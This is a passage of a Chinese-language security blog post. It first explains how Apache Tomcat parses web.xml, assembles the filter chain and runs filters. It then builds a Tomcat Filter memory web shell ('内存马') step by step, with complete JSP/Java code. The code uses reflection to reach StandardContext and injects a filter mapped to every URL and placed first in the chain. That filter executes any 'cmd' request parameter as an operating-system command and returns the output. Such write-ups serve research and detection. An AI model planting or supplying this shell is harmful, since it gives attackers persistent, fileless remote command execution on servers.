<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span> <span class="comment">&lt;!-- filter标签的内容将被存入FilterDef类 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span><span class="comment">&lt;!-- filter标签的内容将被存入FilterMap类 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行一下看看：</p>
<p><a href="http://localhost:8080/testEnv_war_exploded/test">http://localhost:8080/testEnv_war_exploded/test</a></p>
<p>控制台出现信息，就这样Filter就设置成功了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208150319911.png" alt="image-20211208150319911"></p>
<h1 id="Tomcat-Filter流程"><a href="#Tomcat-Filter流程" class="headerlink" title="Tomcat Filter流程"></a>Tomcat Filter流程</h1><h2 id="web-xml的解析-amp-Context从何而来？"><a href="#web-xml的解析-amp-Context从何而来？" class="headerlink" title="web.xml的解析&amp;Context从何而来？"></a>web.xml的解析&amp;Context从何而来？</h2><p>web.xml中存放着filter相关的配置，它必然会被解析读取。web.xml文件里解析出来的内容由Tomcat中的<strong>WebXml类</strong>来存储。</p>
<p>在监听到<strong>Lifecycle.CONFIGURE_START_EVENT</strong>事件后，<strong>WebXml</strong>将自身的存储的信息注入到Context中。</p>
<p>具体流程如下：</p>
<ul>
<li><strong>ContextConfig</strong>监听到<strong>Lifecycle.CONFIGURE_START_EVENT</strong>事件发生</li>
<li><strong>ContextConfig</strong>调用自身的<code>configureStart()</code>方法， 再调用<code>webConfig()</code>，将/web.xml解析保存到web.xml中，再调用<code>ContextConfig.configureContext(webxml)</code>将webxml中储存的信息注入到<strong>context</strong>中。</li>
</ul>
<p>来看代码：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208183932159.png" alt="image-20211208183932159">监听到事件后call到<strong>webConfig()<strong>方法，在webConfig中解析web.xml的内容、创建</strong>WebXml</strong>实例。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208184646650.png" alt="image-20211208184646650"></p>
<p>随后用<code>ConfigureContext.configureContext(webXml)</code>将<strong>webXml</strong>的信息传入当前<strong>context</strong>中。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208185001033.png" alt="image-20211208185001033"></p>
<p>这样一个<strong>context</strong>就配置好了。</p>
<h2 id="Filter是如何从context中被添加进filterChain的？"><a href="#Filter是如何从context中被添加进filterChain的？" class="headerlink" title="Filter是如何从context中被添加进filterChain的？"></a>Filter是如何从context中被添加进filterChain的？</h2><p><code>org.apache.catalina.core.StandardWrapperValve</code>的<code>invoke()</code>call到**createFilterChain()**，</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201730461.png" alt="image-20211208201730461">创建filterChain，</p>
<p>我们可以看到在<strong>createFilterChain()<strong>方法里，我们获取到了</strong>context</strong>，从而从这个<strong>context</strong>中获取到<strong>filterMaps</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201919328.png" alt="image-20211208201919328"></p>
<p><strong>FilterMaps</strong>中存放的就是我们web.xml中写到的<code>&lt;filter-maping&gt;&lt;/filter-mapping&gt;</code></p>
<p>接着匹配当前访问的URL和filterMap中的URL是否一样(第一个if)，如果匹配，将从<strong>filterConfig</strong>中寻找该<strong>filterMap</strong>中对应的名字，如果找到了，就将该<strong>Filter</strong>的<strong>filterConfig</strong>添加进<strong>filterChain</strong>里。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208202205923.png" alt="image-20211208202205923"></p>
<p>我们继续跟踪到<strong>addFilter()<strong>，最后</strong>filterConfig</strong>会被放入<strong>filters</strong>数组当中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line">    ApplicationFilterConfig[] newFilters = <span class="built_in">this</span>.filters;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> newFilters.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filter</span> <span class="operator">=</span> newFilters[var4];</span><br><span class="line">        <span class="keyword">if</span> (filter == filterConfig) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.n == <span class="built_in">this</span>.filters.length) &#123;<span class="comment">//如果n等于当前filters数组的长度，那么就给filter数组扩容</span></span><br><span class="line">        newFilters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="built_in">this</span>.n + <span class="number">10</span>];</span><br><span class="line">        System.arraycopy(<span class="built_in">this</span>.filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, <span class="built_in">this</span>.n);</span><br><span class="line">        <span class="built_in">this</span>.filters = newFilters;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.filters[<span class="built_in">this</span>.n++] = filterConfig;<span class="comment">//将filter放入的filters数组的同时，将n+1，相当于是在计数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Filter的执行"><a href="#Filter的执行" class="headerlink" title="Filter的执行"></a>Filter的执行</h2><p>现在<strong>filters</strong>数组（也就是<strong>filterChain</strong>）已经被组装完毕了，它又该如何被执行呢？</p>
<p>现在继续回到<strong>StandardWrapperValve.invoke()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220131316.png" alt="image-20211208220131316">很明显，filterChain中的filter被执行了 - <code>doFilter()</code></p>
<p>跟进去看看：<strong>ApplicationFilterChain.doFilter():<strong>调用了</strong>internalDoFilter</strong>()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220257323.png" alt="image-20211208220257323"></p>
<p>继续跟：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220517246.png" alt="image-20211208220517246"></p>
<p>然后调用到了我们写在TestFilter.java里面的<code>doFilter()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">//执行过滤操作</span></span><br><span class="line"></span><br><span class="line">    filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，我们整个filter的执行就到此结束。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们来总结一下涉及到的一些Class，这里都以英文字面意思来理解比较容易。</p>
<p>Filter的配置是由我们手动写在<strong>web.xml</strong>文件里的，所以需要把配置取出来，封装进这个web程序的context里面，以便其它地方调用。</p>
<ul>
<li><p>ContextConfig - 专门<strong>配置</strong>Context(可以理解为存储当前web程序信息)的类。</p>
<ul>
<li>ContextConfig类负责监听<strong>Lifecycle.CONFIGURE_START_EVENT</strong>，也就是“配置开始”事件，监听到就会开始配置 - **configureStart()**。</li>
<li>ConfigureStart()中会call到webConfig()<strong>方法 - <strong>webConfig</strong>需要先从</strong>web.xml中把内容取出来，先创建一个WebXml类的instance.</li>
<li>用configureContext(webXml)把webXml的内容都存入当前的context。</li>
</ul>
</li>
<li><p>StandardWrapperValve - 一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p>
<ul>
<li><p>把这个StandardWrapperValve简单理解为一个servlet，这个servlet接收到了数据，就要对数据进行过滤，要过滤就要先获取过滤规则，也就是我们的过滤器Filters</p>
</li>
<li><p>它利用ApplicationFilterFactory.createFilterChain()来创建一个FilterChain = 》 里面是所有匹配到的filterConfig的集合 </p>
<ul>
<li>createFilterChain()读取了当前context，并从获取到的context中读取到了<strong>filterMaps</strong> =》 里面是所有filter的mapping的情况（<strong>见环境搭建中的web.xml文件）</strong>，如果当前访问的URL匹配上了filter mapping，且在<strong>filterConfig</strong>中有其filter-name有对应的filter-class被配置，那么就将这个<strong>filterConfig</strong>添加进filterChain里面，以供使用。至此，filterChain组装完毕。</li>
</ul>
</li>
<li><p>filterChain有了，接下来就是依次去触发filter了。StandardWrapperValve执行filterChain.doFilter()开始执行chain里面的filter。</p>
<ul>
<li>从chain里面获取filterConfig，再从filterConfig中获取到filter</li>
</ul>
</li>
<li><p>最后执行filter.doFilter()</p>
</li>
</ul>
</li>
</ul>
<p><strong>可以看出来，一个filter被执行的条件</strong>：</p>
<ul>
<li>在context#filterMaps中，有和当前访问URL相匹配的<strong>url-pattern</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>    <span class="comment">&lt;!--url要匹配--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>filterConfig中需要有这个filter名字对应的class</p>
<p>filterConfig中不仅存放了<strong>filterDef</strong>，还存放了当时的context。filterDef对应xml中如下内容：</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>   <span class="comment">&lt;!--class要匹配上filter name--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>假设我们要自己构造一个这样的符合条件的filter应该怎么做呢？</p>
<h1 id="Filter内存马的运用"><a href="#Filter内存马的运用" class="headerlink" title="Filter内存马的运用"></a>Filter内存马的运用</h1><h2 id="构造内存马思路"><a href="#构造内存马思路" class="headerlink" title="构造内存马思路"></a>构造内存马思路</h2><ul>
<li>构造一个含恶意代码的filter</li>
<li>用filterDef将filter进行封装(filter-name,filter-class)</li>
<li>将构造的filterDef添加到filterDefs和filterConfigs中</li>
<li>创建一个新的filterMap将URL和filter进行绑定，并添加到filterMaps中</li>
</ul>
<blockquote>
<p>要注意的是，因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</p>
<p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。</p>
</blockquote>
<h2 id="开始构造内存马"><a href="#开始构造内存马" class="headerlink" title="开始构造内存马"></a>开始构造内存马</h2><h3 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h3><p>前面说到，FilterMaps是放在context的，所以需要先得到context.</p>
<p>当我们访问一个jsp文件的时候，该jsp文件能够接收到request,所以我们可以获取到该request的servletContext</p>
<p>观察一下servletContext的内容：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209102528669.png" alt="image-20211209102528669"></p>
<p>我们发现实际上内容都是在<strong>StandardContext</strong>里面的 - servletContext的context是ApplicationContext类，ApplicationContext是StandardContext类。</p>
<p><strong>可以一层一层获取</strong>：最终获取到StandardContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();<span class="comment">//获取servletContext</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取servletContext.context</span></span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);<span class="comment">//得到applicationContext</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取applicationContext.context</span></span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);<span class="comment">//得到standardContext</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>其它的context获取方法：</strong></p>
<p>从线程中获取StandardContext 如果没有request对象的话可以从当前线程中获取 <a href="https://zhuanlan.zhihu.com/p/114625962">https://zhuanlan.zhihu.com/p/114625962</a></p>
<p>从MBean中获取 <a href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a></p>
</blockquote>
<h3 id="修改context-amp-创建恶意Filter"><a href="#修改context-amp-创建恶意Filter" class="headerlink" title="修改context&amp;创建恶意Filter"></a>修改context&amp;创建恶意Filter</h3><p><strong>StandardContext</strong>中可以看到：其包含了我们需要用到的filterConfigs, filterDefs, filterMaps</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209103331546.png" alt="image-20211209103331546"></p>
<p>按照之前的思路：</p>
<blockquote>
<ul>
<li>构造一个含恶意代码的filter</li>
<li>用filterDef将filter进行封装(filter-name,filter-class)</li>
<li>将构造的filterDef添加到filterDefs和filterConfigs中</li>
<li>创建一个新的filterMap将URL和filter进行绑定，并添加到filterMaps中</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;leihehe&quot;</span>;<span class="comment">//先设置这个恶意filter的名字</span></span><br><span class="line"><span class="comment">/*获取filterConfigs*/</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);<span class="comment">//获取到filterConfigs =&gt; 一堆filterConfig的集合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;<span class="comment">//判断我们自己设定filter名字的filterConfig是否不存在</span></span><br><span class="line">    		<span class="comment">/* 不存在，开始创建恶意 Filter */</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">//这段代码是shell恶意代码，就不详细解释了</span></span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();<span class="comment">//windows环境下测试</span></span><br><span class="line">                    <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个filtermap</span></span><br><span class="line"><span class="comment">         * 设置filter的名字和对应的urlpattern</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="最终内存马"><a href="#最终内存马" class="headerlink" title="最终内存马"></a>最终内存马</h3><p><strong>leihehe.jsp</strong></p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();<span class="comment">//获取servletContext</span></span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取servletContext.context</span></span><br><span class="line">  appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);<span class="comment">//得到applicationContext</span></span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取applicationContext.context</span></span><br><span class="line">  stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);<span class="comment">//得到standardContext</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;leihehe&quot;</span>;<span class="comment">//先设置这个恶意filter的名字</span></span><br><span class="line"><span class="comment">/*获取filterConfigs*/</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);<span class="comment">//获取到filterConfigs =&gt; 一堆filterConfig的集合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;<span class="comment">//判断我们自己设定filter名字的filterConfig是否不存在</span></span><br><span class="line">    		<span class="comment">/* 不存在，开始创建恶意 Filter */</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">//这段代码是shell恶意代码，就不详细解释了</span></span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();<span class="comment">//windows环境下测试</span></span><br><span class="line">                    <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个filtermap</span></span><br><span class="line"><span class="comment">         * 设置filter的名字和对应的urlpattern</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        